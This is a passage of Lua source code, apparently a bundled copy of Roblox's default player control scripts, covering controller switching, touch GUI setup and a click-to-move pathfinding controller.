				if FFlagUserFixExternalJumpRequest then
					if self.activeController:GetIsJumping() or (self.touchJumpController and self.touchJumpController:GetIsJumping()) then
						self.humanoid.Jump = true
					end
				else
					self.humanoid.Jump = self.activeController:GetIsJumping() or (self.touchJumpController and self.touchJumpController:GetIsJumping())
				end
			end
		end
		
		function ControlModule:OnHumanoidSeated(active, currentSeatPart)
			if active then
				if currentSeatPart and currentSeatPart:IsA("VehicleSeat") then
					if not self.vehicleController then
						self.vehicleController = self.vehicleController.new(CONTROL_ACTION_PRIORITY)
					end
					self.vehicleController:Enable(true, currentSeatPart)
				end
			else
				if self.vehicleController then
					self.vehicleController:Enable(false, currentSeatPart)
				end
			end
		end
		
		function ControlModule:OnCharacterAdded(char)
			self.humanoid = char:FindFirstChildOfClass("Humanoid")
			while not self.humanoid do
				char.ChildAdded:wait()
				self.humanoid = char:FindFirstChildOfClass("Humanoid")
			end
		
			if self.touchGui then
				self.touchGui.Enabled = true
			end
		
			if self.humanoidSeatedConn then
				self.humanoidSeatedConn:Disconnect()
				self.humanoidSeatedConn = nil
			end
			self.humanoidSeatedConn = self.humanoid.Seated:Connect(function(active, currentSeatPart)
				self:OnHumanoidSeated(active, currentSeatPart)
			end)
		end
		
		function ControlModule:OnCharacterRemoving(char)
			self.humanoid = nil
		
			if self.touchGui then
				self.touchGui.Enabled = false
			end
		end
		
		-- Helper function to lazily instantiate a controller if it does not yet exist,
		-- disable the active controller if it is different from the on being switched to,
		-- and then enable the requested controller. The argument to this function must be
		-- a reference to one of the control modules, i.e. Keyboard, Gamepad, etc.
		function ControlModule:SwitchToController(controlModule)
			if not controlModule then
				if self.activeController then
					self.activeController:Enable(false)
				end
				self.activeController = nil
				self.activeControlModule = nil
			else
				if not self.controllers[controlModule] then
					self.controllers[controlModule] = controlModule.new(CONTROL_ACTION_PRIORITY)
				end
		
				if self.activeController ~= self.controllers[controlModule] then
					if self.activeController then
						self.activeController:Enable(false)
					end
					self.activeController = self.controllers[controlModule]
					self.activeControlModule = controlModule -- Only used to check if controller switch is necessary
		
					if self.touchControlFrame and (self.activeControlModule == ClickToMove
								or self.activeControlModule == TouchThumbstick
								or self.activeControlModule == DynamicThumbstick) then
						if not self.controllers[TouchJump] then
							self.controllers[TouchJump] = TouchJump.new()
						end
						self.touchJumpController = self.controllers[TouchJump]
						self.touchJumpController:Enable(true, self.touchControlFrame)
					else
						if self.touchJumpController then
							self.touchJumpController:Enable(false)
						end
					end
		
					self:EnableActiveControlModule()
				end
			end
		end
		
		function ControlModule:OnLastInputTypeChanged(newLastInputType)
			if lastInputType == newLastInputType then
				warn("LastInputType Change listener called with current type.")
			end
			lastInputType = newLastInputType
		
			if lastInputType == Enum.UserInputType.Touch then
				-- TODO: Check if touch module already active
				local touchModule, success = self:SelectTouchModule()
				if success then
					while not self.touchControlFrame do
						wait()
					end
					self:SwitchToController(touchModule)
				end
			elseif computerInputTypeToModuleMap[lastInputType] ~= nil then
				local computerModule = self:SelectComputerMovementModule()
				if computerModule then
					self:SwitchToController(computerModule)
				end
			end
		end
		
		-- Called when any relevant values of GameSettings or LocalPlayer change, forcing re-evalulation of
		-- current control scheme
		function ControlModule:OnComputerMovementModeChange()
			local controlModule, success =  self:SelectComputerMovementModule()
			if success then
				self:SwitchToController(controlModule)
			end
		end
		
		function ControlModule:OnTouchMovementModeChange()
			local touchModule, success = self:SelectTouchModule()
			if success then
				while not self.touchControlFrame do
					wait()
				end
				self:SwitchToController(touchModule)
			end
		end
		
		function ControlModule:CreateTouchGuiContainer()
			if self.touchGui then self.touchGui:Destroy() end
		
			-- Container for all touch device guis
			self.touchGui = Instance.new("ScreenGui")
			self.touchGui.Name = "TouchGui"
			self.touchGui.ResetOnSpawn = false
			self.touchGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
			self.touchGui.Enabled = self.humanoid ~= nil
		
			self.touchControlFrame = Instance.new("Frame")
			self.touchControlFrame.Name = "TouchControlFrame"
			self.touchControlFrame.Size = UDim2.new(1, 0, 1, 0)
			self.touchControlFrame.BackgroundTransparency = 1
			self.touchControlFrame.Parent = self.touchGui
		
			self.touchGui.Parent = self.playerGui
		end
		
		function ControlModule:GetClickToMoveController()
			if not self.controllers[ClickToMove] then
				self.controllers[ClickToMove] = ClickToMove.new(CONTROL_ACTION_PRIORITY)
			end
			return self.controllers[ClickToMove]
		end
		
		return ControlModule.new()
		
	end[click_to_movecontroller] = function()
		--[[
			-- Original By Kip Turner, Copyright Roblox 2014
			-- Updated by Garnold to utilize the new PathfindingService API, 2017
			-- 2018 PlayerScripts Update - AllYourBlox
		--]]
		
		--[[ Flags ]]
		local FFlagUserExcludeNonCollidableForPathfindingSuccess, FFlagUserExcludeNonCollidableForPathfindingResult =
		    pcall(function() return UserSettings():IsUserFeatureEnabled("UserExcludeNonCollidableForPathfinding") end)
		local FFlagUserExcludeNonCollidableForPathfinding = FFlagUserExcludeNonCollidableForPathfindingSuccess and FFlagUserExcludeNonCollidableForPathfindingResult
		
		--[[ Roblox Services ]]--
		local UserInputService = game:GetService("UserInputService")
		local PathfindingService = game:GetService("PathfindingService")
		local Players = game:GetService("Players")
		local DebrisService = game:GetService('Debris')
		local StarterGui = game:GetService("StarterGui")
		local Workspace = game:GetService("Workspace")
		local CollectionService = game:GetService("CollectionService")
		local GuiService = game:GetService("GuiService")
		
		--[[ Configuration ]]
		local ShowPath = true
		local PlayFailureAnimation = true
		local UseDirectPath = false
		local UseDirectPathForVehicle = true
		local AgentSizeIncreaseFactor = 1.0
		local UnreachableWaypointTimeout = 8
		
		--[[ Constants ]]--
		local movementKeys = {
			[Enum.KeyCode.W] = true;
			[Enum.KeyCode.A] = true;
			[Enum.KeyCode.S] = true;
			[Enum.KeyCode.D] = true;
			[Enum.KeyCode.Up] = true;
			[Enum.KeyCode.Down] = true;
		}
		
		local Player = Players.LocalPlayer
		
		local ClickToMoveDisplay = require(script.Parent:WaitForChild("ClickToMoveDisplay"))
		
		local ZERO_VECTOR3 = Vector3.new(0,0,0)
		local ALMOST_ZERO = 0.000001
		
		
		--------------------------UTIL LIBRARY-------------------------------
		local Utility = {}
		do
			local function FindCharacterAncestor(part)
				if part then
					local humanoid = part:FindFirstChildOfClass("Humanoid")
					if humanoid then
						return part, humanoid
					else
						return FindCharacterAncestor(part.Parent)
					end
				end
			end
			Utility.FindCharacterAncestor = FindCharacterAncestor
		
			local function Raycast(ray, ignoreNonCollidable, ignoreList)
				ignoreList = ignoreList or {}
				local hitPart, hitPos, hitNorm, hitMat = Workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
				if hitPart then
					if ignoreNonCollidable and hitPart.CanCollide == false then
						-- We always include character parts so a user can click on another character
						-- to walk to them.
						local _, humanoid = FindCharacterAncestor(hitPart)
						if humanoid == nil then
							table.insert(ignoreList, hitPart)
							return Raycast(ray, ignoreNonCollidable, ignoreList)
						end
					end
					return hitPart, hitPos, hitNorm, hitMat
				end
				return nil, nil
			end
			Utility.Raycast = Raycast
		end
		
		local humanoidCache = {}
		local function findPlayerHumanoid(player)
			local character = player and player.Character
			if character then
				local resultHumanoid = humanoidCache[player]
				if resultHumanoid and resultHumanoid.Parent == character then
					return resultHumanoid
				else
					humanoidCache[player] = nil -- Bust Old Cache
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid then
						humanoidCache[player] = humanoid
					end
					return humanoid
				end
			end
		end
		
		--------------------------CHARACTER CONTROL-------------------------------
		local CurrentIgnoreList
		local CurrentIgnoreTag = nil
		
		local TaggedInstanceAddedConnection = nil
		local TaggedInstanceRemovedConnection = nil
		
		local function GetCharacter()
			return Player and Player.Character
		end
		
		local function UpdateIgnoreTag(newIgnoreTag)
			if newIgnoreTag == CurrentIgnoreTag then
				return
			end
			if TaggedInstanceAddedConnection then
				TaggedInstanceAddedConnection:Disconnect()
				TaggedInstanceAddedConnection = nil
			end
			if TaggedInstanceRemovedConnection then
				TaggedInstanceRemovedConnection:Disconnect()
				TaggedInstanceRemovedConnection = nil
			end
			CurrentIgnoreTag = newIgnoreTag
			CurrentIgnoreList = {GetCharacter()}
			if CurrentIgnoreTag ~= nil then
				local ignoreParts = CollectionService:GetTagged(CurrentIgnoreTag)
				for _, ignorePart in ipairs(ignoreParts) do
					table.insert(CurrentIgnoreList, ignorePart)
				end
				TaggedInstanceAddedConnection = CollectionService:GetInstanceAddedSignal(
					CurrentIgnoreTag):Connect(function(ignorePart)
					table.insert(CurrentIgnoreList, ignorePart)
				end)
				TaggedInstanceRemovedConnection = CollectionService:GetInstanceRemovedSignal(
					CurrentIgnoreTag):Connect(function(ignorePart)
					for i = 1, #CurrentIgnoreList do
						if CurrentIgnoreList[i] == ignorePart then
							CurrentIgnoreList[i] = CurrentIgnoreList[#CurrentIgnoreList]
							table.remove(CurrentIgnoreList)
							break
						end
					end
				end)
			end
		end
		
		local function getIgnoreList()
			if CurrentIgnoreList then
				return CurrentIgnoreList
			end
			CurrentIgnoreList = {}
			table.insert(CurrentIgnoreList, GetCharacter())
			return CurrentIgnoreList
		end
		
		local function minV(a, b)
			return Vector3.new(math.min(a.X, b.X), math.min(a.Y, b.Y), math.min(a.Z, b.Z))
		end
		local function maxV(a, b)
			return Vector3.new(math.max(a.X, b.X), math.max(a.Y, b.Y), math.max(a.Z, b.Z))
		end
		local function getCollidableExtentsSize(character)
			if character == nil or character.PrimaryPart == nil then return end
			local toLocalCFrame = character.PrimaryPart.CFrame:inverse()
			local min = Vector3.new(math.huge, math.huge, math.huge)
			local max = Vector3.new(-math.huge, -math.huge, -math.huge)
			for _,descendant in pairs(character:GetDescendants()) do
				if descendant:IsA('BasePart') and descendant.CanCollide then
					local localCFrame = toLocalCFrame * descendant.CFrame
					local size = Vector3.new(descendant.Size.X / 2, descendant.Size.Y / 2, descendant.Size.Z / 2)
					local vertices = {
						Vector3.new( size.X,  size.Y,  size.Z),
						Vector3.new( size.X,  size.Y, -size.Z),
						Vector3.new( size.X, -size.Y,  size.Z),
						Vector3.new( size.X, -size.Y, -size.Z),
						Vector3.new(-size.X,  size.Y,  size.Z),
						Vector3.new(-size.X,  size.Y, -size.Z),
						Vector3.new(-size.X, -size.Y,  size.Z),
						Vector3.new(-size.X, -size.Y, -size.Z)
					}
					for _,vertex in ipairs(vertices) do
						local v = localCFrame * vertex
						min = minV(min, v)
						max = maxV(max, v)
					end
				end
			end
			local r = max - min
			if r.X < 0 or r.Y < 0 or r.Z < 0 then return nil end
			return r
		end
		
		-----------------------------------PATHER--------------------------------------
		
		local function Pather(endPoint, surfaceNormal, overrideUseDirectPath)
			local this = {}
		
			local directPathForHumanoid
			local directPathForVehicle
			if overrideUseDirectPath ~= nil then
				directPathForHumanoid = overrideUseDirectPath
				directPathForVehicle = overrideUseDirectPath
			else
				directPathForHumanoid = UseDirectPath
				directPathForVehicle = UseDirectPathForVehicle
			end
		
			this.Cancelled = false
			this.Started = false
		
			this.Finished = Instance.new("BindableEvent")
			this.PathFailed = Instance.new("BindableEvent")
		
			this.PathComputing = false
			this.PathComputed = false
		
			this.OriginalTargetPoint = endPoint
			this.TargetPoint = endPoint
			this.TargetSurfaceNormal = surfaceNormal
		
			this.DiedConn = nil
			this.SeatedConn = nil
			this.BlockedConn = nil
			this.TeleportedConn = nil
		
			this.CurrentPoint = 0
		
			this.HumanoidOffsetFromPath = ZERO_VECTOR3
		
			this.CurrentWaypointPosition = nil
			this.CurrentWaypointPlaneNormal = ZERO_VECTOR3
			this.CurrentWaypointPlaneDistance = 0
			this.CurrentWaypointNeedsJump = false;
		
			this.CurrentHumanoidPosition = ZERO_VECTOR3
			this.CurrentHumanoidVelocity = 0
		
			this.NextActionMoveDirection = ZERO_VECTOR3
			this.NextActionJump = false
		
			this.Timeout = 0
		
			this.Humanoid = findPlayerHumanoid(Player)
			this.OriginPoint = nil
			this.AgentCanFollowPath = false
			this.DirectPath = false
			this.DirectPathRiseFirst = false
		
			local rootPart = this.Humanoid and this.Humanoid.RootPart
			if rootPart then
				-- Setup origin
				this.OriginPoint = rootPart.CFrame.p
		
				-- Setup agent
				local agentRadius = 2
				local agentHeight = 5
				local agentCanJump = true
		
				local seat = this.Humanoid.SeatPart
				if seat and seat:IsA("VehicleSeat") then
					-- Humanoid is seated on a vehicle
					local vehicle = seat:FindFirstAncestorOfClass("Model")
					if vehicle then
						-- Make sure the PrimaryPart is set to the vehicle seat while we compute the extends.
						local tempPrimaryPart = vehicle.PrimaryPart
						vehicle.PrimaryPart = seat
		
						-- For now, only direct path
						if directPathForVehicle then
							local extents = vehicle:GetExtentsSize()
							agentRadius = AgentSizeIncreaseFactor * 0.5 * math.sqrt(extents.X * extents.X + extents.Z * extents.Z)
							agentHeight = AgentSizeIncreaseFactor * extents.Y
							agentCanJump = false
							this.AgentCanFollowPath = true
							this.DirectPath = directPathForVehicle
						end
		
						-- Reset PrimaryPart
						vehicle.PrimaryPart = tempPrimaryPart
					end
				else
					local extents
					if FFlagUserExcludeNonCollidableForPathfinding then
						local character = GetCharacter()
						if character ~= nil then
							extents = getCollidableExtentsSize(character)
						end
					end
					if extents == nil then
						extents = GetCharacter():GetExtentsSize()
					end
					agentRadius = AgentSizeIncreaseFactor * 0.5 * math.sqrt(extents.X * extents.X + extents.Z * extents.Z)
					agentHeight = AgentSizeIncreaseFactor * extents.Y
					agentCanJump = (this.Humanoid.JumpPower > 0)
					this.AgentCanFollowPath = true
					this.DirectPath = directPathForHumanoid
					this.DirectPathRiseFirst = this.Humanoid.Sit
				end
		
				-- Build path object
				this.pathResult = PathfindingService:CreatePath({AgentRadius = agentRadius, AgentHeight = agentHeight, AgentCanJump = agentCanJump})
			end
		
			function this:Cleanup()
				if this.stopTraverseFunc then
					this.stopTraverseFunc()
					this.stopTraverseFunc = nil
				end
		
				if this.MoveToConn then
					this.MoveToConn:Disconnect()
					this.MoveToConn = nil
				end
		
				if this.BlockedConn then
					this.BlockedConn:Disconnect()
					this.BlockedConn = nil
				end
		
				if this.DiedConn then
					this.DiedConn:Disconnect()
					this.DiedConn = nil
				end
		
				if this.SeatedConn then
					this.SeatedConn:Disconnect()
					this.SeatedConn = nil
				end
		
				if this.TeleportedConn then
					this.TeleportedConn:Disconnect()
					this.TeleportedConn = nil
				end
		
				this.Started = false
			end
		
			function this:Cancel()
				this.Cancelled = true
				this:Cleanup()
			end
		
			function this:IsActive()
				return this.AgentCanFollowPath and this.Started and not this.Cancelled
			end
		
			function this:OnPathInterrupted()
				-- Stop moving
				this.Cancelled = true
				this:OnPointReached(false)
			end
		
			function this:ComputePath()
				if this.OriginPoint then
					if this.PathComputed or this.PathComputing then return end
					this.PathComputing = true
					if this.AgentCanFollowPath then
						if this.DirectPath then
							this.pointList = {
								PathWaypoint.new(this.OriginPoint, Enum.PathWaypointAction.Walk),
								PathWaypoint.new(this.TargetPoint, this.DirectPathRiseFirst and Enum.PathWaypointAction.Jump or Enum.PathWaypointAction.Walk)
							}
							this.PathComputed = true
						else
							this.pathResult:ComputeAsync(this.OriginPoint, this.TargetPoint)
							this.pointList = this.pathResult:GetWaypoints()
							this.BlockedConn = this.pathResult.Blocked:Connect(function(blockedIdx) this:OnPathBlocked(blockedIdx) end)
							this.PathComputed = this.pathResult.Status == Enum.PathStatus.Success
						end
					end
					this.PathComputing = false
				end
			end
		
			function this:IsValidPath()
				this:ComputePath()
				return this.PathComputed and this.AgentCanFollowPath
			end
		
			this.Recomputing = false
			function this:OnPathBlocked(blockedWaypointIdx)
				local pathBlocked = blockedWaypointIdx >= this.CurrentPoint
				if not pathBlocked or this.Recomputing then
					return
				end
		
				this.Recomputing = true
		
				if this.stopTraverseFunc then
					this.stopTraverseFunc()
					this.stopTraverseFunc = nil
				end
		
				this.OriginPoint = this.Humanoid.RootPart.CFrame.p
		
				this.pathResult:ComputeAsync(this.OriginPoint, this.TargetPoint)
				this.pointList = this.pathResult:GetWaypoints()
				if #this.pointList > 0 then
					this.HumanoidOffsetFromPath = this.pointList[1].Position - this.OriginPoint
				end
				this.PathComputed = this.pathResult.Status == Enum.PathStatus.Success
		
				if ShowPath then
					this.stopTraverseFunc, this.setPointFunc = ClickToMoveDisplay.CreatePathDisplay(this.pointList)
				end
				if this.PathComputed then
					this.CurrentPoint = 1 -- The first waypoint is always the start location. Skip it.
					this:OnPointReached(true) -- Move to first point
				else
					this.PathFailed:Fire()
					this:Cleanup()
				end
		
				this.Recomputing = false
			end
		
			function this:OnRenderStepped(dt)
				if this.Started and not this.Cancelled then
					-- Check for Timeout (if a waypoint is not reached within the delay, we fail)
					this.Timeout = this.Timeout + dt
					if this.Timeout > UnreachableWaypointTimeout then
						this:OnPointReached(false)
						return
					end
		
					-- Get Humanoid position and velocity
					this.CurrentHumanoidPosition = this.Humanoid.RootPart.Position + this.HumanoidOffsetFromPath
					this.CurrentHumanoidVelocity = this.Humanoid.RootPart.Velocity
		
					-- Check if it has reached some waypoints
					while this.Started and this:IsCurrentWaypointReached() do
						this:OnPointReached(true)
					end
		
					-- If still started, update actions
					if this.Started then
						-- Move action
						this.NextActionMoveDirection = this.CurrentWaypointPosition - this.CurrentHumanoidPosition
						if this.NextActionMoveDirection.Magnitude > ALMOST_ZERO then
							this.NextActionMoveDirection = this.NextActionMoveDirection.Unit
						else
							this.NextActionMoveDirection = ZERO_VECTOR3
						end
						-- Jump action
						if this.CurrentWaypointNeedsJump then
							this.NextActionJump = true
							this.CurrentWaypointNeedsJump = false	-- Request jump only once
						else
							this.NextActionJump = false
						end
					end
				end
			end
		
			function this:IsCurrentWaypointReached()
				local reached = false
		
				-- Check we do have a plane, if not, we consider the waypoint reached
				if this.CurrentWaypointPlaneNormal ~= ZERO_VECTOR3 then
					-- Compute distance of Humanoid from destination plane
					local dist = this.CurrentWaypointPlaneNormal:Dot(this.CurrentHumanoidPosition) - this.CurrentWaypointPlaneDistance
					-- Compute the component of the Humanoid velocity that is towards the plane
					local velocity = -this.CurrentWaypointPlaneNormal:Dot(this.CurrentHumanoidVelocity)
					-- Compute the threshold from the destination plane based on Humanoid velocity
					local threshold = math.max(1.0, 0.0625 * velocity)
					-- If we are less then threshold in front of the plane (between 0 and threshold) or if we are behing the plane (less then 0), we consider we reached it
					reached = dist < threshold
				else
					reached = true
				end
		
				if reached then
					this.CurrentWaypointPosition = nil
					this.CurrentWaypointPlaneNormal	= ZERO_VECTOR3
					this.CurrentWaypointPlaneDistance = 0
				end
		
				return reached
			end
		
			function this:OnPointReached(reached)
		
				if reached and not this.Cancelled then
					-- First, destroyed the current displayed waypoint
					if this.setPointFunc then
						this.setPointFunc(this.CurrentPoint)
					end
		
					local nextWaypointIdx = this.CurrentPoint + 1
		
					if nextWaypointIdx > #this.pointList then
						-- End of path reached
						if this.stopTraverseFunc then
							this.stopTraverseFunc()
						end
						this.Finished:Fire()
						this:Cleanup()
					else
						local currentWaypoint = this.pointList[this.CurrentPoint]
						local nextWaypoint = this.pointList[nextWaypointIdx]
		
						-- If airborne, only allow to keep moving
						-- if nextWaypoint.Action ~= Jump, or path mantains a direction
						-- Otherwise, wait until the humanoid gets to the ground
						local currentState = this.Humanoid:GetState()
						local isInAir = currentState == Enum.HumanoidStateType.FallingDown
							or currentState == Enum.HumanoidStateType.Freefall
							or currentState == Enum.HumanoidStateType.Jumping
		
						if isInAir then
							local shouldWaitForGround = nextWaypoint.Action == Enum.PathWaypointAction.Jump
							if not shouldWaitForGround and this.CurrentPoint > 1 then
								local prevWaypoint = this.pointList[this.CurrentPoint - 1]
		
								local prevDir = currentWaypoint.Position - prevWaypoint.Position
								local currDir = nextWaypoint.Position - currentWaypoint.Position
		
								local prevDirXZ = Vector2.new(prevDir.x, prevDir.z).Unit
								local currDirXZ = Vector2.new(currDir.x, currDir.z).Unit
		
								local THRESHOLD_COS = 0.996 -- ~cos(5 degrees)
								shouldWaitForGround = prevDirXZ:Dot(currDirXZ) < THRESHOLD_COS
							end
		
							if shouldWaitForGround then
								this.Humanoid.FreeFalling:Wait()
		
								-- Give time to the humanoid's state to change
								-- Otherwise, the jump flag in Humanoid
								-- will be reset by the state change
								wait(0.1)
							end
						end
		
						-- Move to the next point
						this:MoveToNextWayPoint(currentWaypoint, nextWaypoint, nextWaypointIdx)
					end
				else
					this.PathFailed:Fire()
					this:Cleanup()
				end
			end
		
			function this:MoveToNextWayPoint(currentWaypoint, nextWaypoint, nextWaypointIdx)
				-- Build next destination plane
				-- (plane normal is perpendicular to the y plane and is from next waypoint towards current one (provided the two waypoints are not at the same location))
				-- (plane location is at next waypoint)
				this.CurrentWaypointPlaneNormal = currentWaypoint.Position - nextWaypoint.Position
				this.CurrentWaypointPlaneNormal = Vector3.new(this.CurrentWaypointPlaneNormal.X, 0, this.CurrentWaypointPlaneNormal.Z)
				if this.CurrentWaypointPlaneNormal.Magnitude > ALMOST_ZERO then
					this.CurrentWaypointPlaneNormal	= this.CurrentWaypointPlaneNormal.Unit
					this.CurrentWaypointPlaneDistance = this.CurrentWaypointPlaneNormal:Dot(nextWaypoint.Position)
				else
					-- Next waypoint is the same as current waypoint so no plane
					this.CurrentWaypointPlaneNormal	= ZERO_VECTOR3
					this.CurrentWaypointPlaneDistance = 0
				end
		
				-- Should we jump
				this.CurrentWaypointNeedsJump = nextWaypoint.Action == Enum.PathWaypointAction.Jump;
		
				-- Remember next waypoint position
				this.CurrentWaypointPosition = nextWaypoint.Position
		
				-- Move to next point
				this.CurrentPoint = nextWaypointIdx
		
				-- Finally reset Timeout
				this.Timeout = 0
			end
		
			function this:Start(overrideShowPath)
				if not this.AgentCanFollowPath then
					this.PathFailed:Fire()
					return
				end
		
				if this.Started then return end
				this.Started = true
		
				ClickToMoveDisplay.CancelFailureAnimation()
		
				if ShowPath then
					if overrideShowPath == nil or overrideShowPath then
						this.stopTraverseFunc, this.setPointFunc = ClickToMoveDisplay.CreatePathDisplay(this.pointList, this.OriginalTargetPoint)
					end
				end
		
				if #this.pointList > 0 then
					-- Determine the humanoid offset from the path's first point
					-- Offset of the first waypoint from the path's origin point
					this.HumanoidOffsetFromPath = Vector3.new(0, this.pointList[1].Position.Y - this.OriginPoint.Y, 0)
		
					-- As well as its current position and velocity
					this.CurrentHumanoidPosition = this.Humanoid.RootPart.Position + this.HumanoidOffsetFromPath
					this.CurrentHumanoidVelocity = this.Humanoid.RootPart.Velocity
		
					-- Connect to events
					this.SeatedConn = this.Humanoid.Seated:Connect(function(isSeated, seat) this:OnPathInterrupted() end)
					this.DiedConn = this.Humanoid.Died:Connect(function() this:OnPathInterrupted() end)
					this.TeleportedConn = this.Humanoid.RootPart:GetPropertyChangedSignal("CFrame"):Connect(function() this:OnPathInterrupted() end)
		
					-- Actually start
					this.CurrentPoint = 1 -- The first waypoint is always the start location. Skip it.
					this:OnPointReached(true) -- Move to first point
				else
					this.PathFailed:Fire()
					if this.stopTraverseFunc then
						this.stopTraverseFunc()
					end
				end
			end
		
			--We always raycast to the ground in the case that the user clicked a wall.
			local offsetPoint = this.TargetPoint + this.TargetSurfaceNormal*1.5
			local ray = Ray.new(offsetPoint, Vector3.new(0,-1,0)*50)
			local newHitPart, newHitPos = Workspace:FindPartOnRayWithIgnoreList(ray, getIgnoreList())
			if newHitPart then
				this.TargetPoint = newHitPos
			end
			this:ComputePath()
		
			return this
		end
		
		-------------------------------------------------------------------------
		
		local function CheckAlive()
			local humanoid = findPlayerHumanoid(Player)
			return humanoid ~= nil and humanoid.Health > 0
		end
		
		local function GetEquippedTool(character)
			if character ~= nil then
				for _, child in pairs(character:GetChildren()) do
					if child:IsA('Tool') then
						return child
					end
				end
			end
		end
		
		local ExistingPather = nil
		local ExistingIndicator = nil
		local PathCompleteListener = nil
		local PathFailedListener = nil
		
		local function CleanupPath()
			if ExistingPather then
				ExistingPather:Cancel()
				ExistingPather = nil
			end
			if PathCompleteListener then
				PathCompleteListener:Disconnect()
				PathCompleteListener = nil
			end
			if PathFailedListener then
				PathFailedListener:Disconnect()
				PathFailedListener = nil
			end
			if ExistingIndicator then
				ExistingIndicator:Destroy()
			end
		end
		
		local function HandleMoveTo(thisPather, hitPt, hitChar, character, overrideShowPath)
			if ExistingPather then
				CleanupPath()
			end
			ExistingPather = thisPather
			thisPather:Start(overrideShowPath)
		
			PathCompleteListener = thisPather.Finished.Event:Connect(function()
				CleanupPath()
				if hitChar then
					local currentWeapon = GetEquippedTool(character)
					if currentWeapon then
						currentWeapon:Activate()
					end
				end
			end)
			PathFailedListener = thisPather.PathFailed.Event:Connect(function()
				CleanupPath()
				if overrideShowPath == nil or overrideShowPath then
					local shouldPlayFailureAnim = PlayFailureAnimation and not (ExistingPather and ExistingPather:IsActive())
					if shouldPlayFailureAnim then
						ClickToMoveDisplay.PlayFailureAnimation()
					end
					ClickToMoveDisplay.DisplayFailureWaypoint(hitPt)
				end
			end)
		end
		
		local function ShowPathFailedFeedback(hitPt)
			if ExistingPather and ExistingPather:IsActive() then
				ExistingPather:Cancel()
			end
			if PlayFailureAnimation then
				ClickToMoveDisplay.PlayFailureAnimation()
			end
			ClickToMoveDisplay.DisplayFailureWaypoint(hitPt)
		end
		
		function OnTap(tapPositions, goToPoint, wasTouchTap)
			-- Good to remember if this is the latest tap event
			local camera = Workspace.CurrentCamera
			local character = Player.Character
		
			if not CheckAlive() then return end
		
			-- This is a path tap position
			if #tapPositions == 1 or goToPoint then
				if camera then
					local unitRay = camera:ScreenPointToRay(tapPositions[1].x, tapPositions[1].y)
					local ray = Ray.new(unitRay.Origin, unitRay.Direction*1000)
		
					local myHumanoid = findPlayerHumanoid(Player)
					local hitPart, hitPt, hitNormal = Utility.Raycast(ray, true, getIgnoreList())
		
					local hitChar, hitHumanoid = Utility.FindCharacterAncestor(hitPart)
					if wasTouchTap and hitHumanoid and StarterGui:GetCore("AvatarContextMenuEnabled") then
						local clickedPlayer = Players:GetPlayerFromCharacter(hitHumanoid.Parent)
						if clickedPlayer then
							CleanupPath()
							return
						end
					end
					if goToPoint then
						hitPt = goToPoint
						hitChar = nil
					end
					if hitPt and character then
						-- Clean up current path
						CleanupPath()
						local thisPather = Pather(hitPt, hitNormal)
						if thisPather:IsValidPath() then
							HandleMoveTo(thisPather, hitPt, hitChar, character)
						else
							-- Clean up
							thisPather:Cleanup()
							-- Feedback here for when we don't have a good path
							ShowPathFailedFeedback(hitPt)
						end
					end
				end
			elseif #tapPositions >= 2 then
				if camera then
					-- Do shoot
					local currentWeapon = GetEquippedTool(character)
					if currentWeapon then
						currentWeapon:Activate()
					end
				end
			end
		end
		
		local function DisconnectEvent(event)
			if event then
				event:Disconnect()
			end
		end
		
		--[[ The ClickToMove Controller Class ]]--
		local KeyboardController = require(script.Parent:WaitForChild("Keyboard"))
		local ClickToMove = setmetatable({}, KeyboardController)
		ClickToMove.__index = ClickToMove
		
		function ClickToMove.new(CONTROL_ACTION_PRIORITY)
			local self = setmetatable(KeyboardController.new(CONTROL_ACTION_PRIORITY), ClickToMove)
		
			self.fingerTouches = {}
			self.numUnsunkTouches = 0
			-- PC simulation
			self.mouse1Down = tick()
			self.mouse1DownPos = Vector2.new()
			self.mouse2DownTime = tick()
			self.mouse2DownPos = Vector2.new()
			self.mouse2UpTime = tick()
		
			self.keyboardMoveVector = ZERO_VECTOR3
		
			self.tapConn = nil
			self.inputBeganConn = nil
			self.inputChangedConn = nil
			self.inputEndedConn = nil
			self.humanoidDiedConn = nil
			self.characterChildAddedConn = nil
			self.onCharacterAddedConn = nil
			self.characterChildRemovedConn = nil
			self.renderSteppedConn = nil
			self.menuOpenedConnection = nil
		
			self.running = false
		
			self.wasdEnabled = false
		
			return self
		end
		
		function ClickToMove:DisconnectEvents()
			DisconnectEvent(self.tapConn)
			DisconnectEvent(self.inputBeganConn)
			DisconnectEvent(self.inputChangedConn)
			DisconnectEvent(self.inputEndedConn)
			DisconnectEvent(self.humanoidDiedConn)
			DisconnectEvent(self.characterChildAddedConn)
			DisconnectEvent(self.onCharacterAddedConn)
			DisconnectEvent(self.renderSteppedConn)
			DisconnectEvent(self.characterChildRemovedConn)
			DisconnectEvent(self.menuOpenedConnection)
		end
		
		function ClickToMove:OnTouchBegan(input, processed)
			if self.fingerTouches[input] == nil and not processed then
				self.numUnsunkTouches = self.numUnsunkTouches + 1
			end
			self.fingerTouches[input] = processed
		end
		
		function ClickToMove:OnTouchChanged(input, processed)
			if self.fingerTouches[input] == nil then
				self.fingerTouches[input] = processed
				if not processed then
					self.numUnsunkTouches = self.numUnsunkTouches + 1
				end
			end
		end
		
		function ClickToMove:OnTouchEnded(input, processed)
			if self.fingerTouches[input] ~= nil and self.fingerTouches[input] == false then
				self.numUnsunkTouches = self.numUnsunkTouches - 1
			end
			self.fingerTouches[input] = nil
		end
		
		
		function ClickToMove:OnCharacterAdded(character)
			self:DisconnectEvents()
		
			self.inputBeganConn = UserInputService.InputBegan:Connect(function(input, processed)
				if input.UserInputType == Enum.UserInputType.Touch then
					self:OnTouchBegan(input, processed)
				end
		
				-- Cancel path when you use the keyboard controls if wasd is enabled.
				if self.wasdEnabled and processed == false and input.UserInputType == Enum.UserInputType.Keyboard
					and movementKeys[input.KeyCode] then
					CleanupPath()
					ClickToMoveDisplay.CancelFailureAnimation()
				end
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					self.mouse1DownTime = tick()
					self.mouse1DownPos = input.Position
				end
				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					self.mouse2DownTime = tick()
					self.mouse2DownPos = input.Position
				end
			end)
		
			self.inputChangedConn = UserInputService.InputChanged:Connect(function(input, processed)
				if input.UserInputType == Enum.UserInputType.Touch then
					self:OnTouchChanged(input, processed)
				end
			end)
		
			self.inputEndedConn = UserInputService.InputEnded:Connect(function(input, processed)
				if input.UserInputType == Enum.UserInputType.Touch then
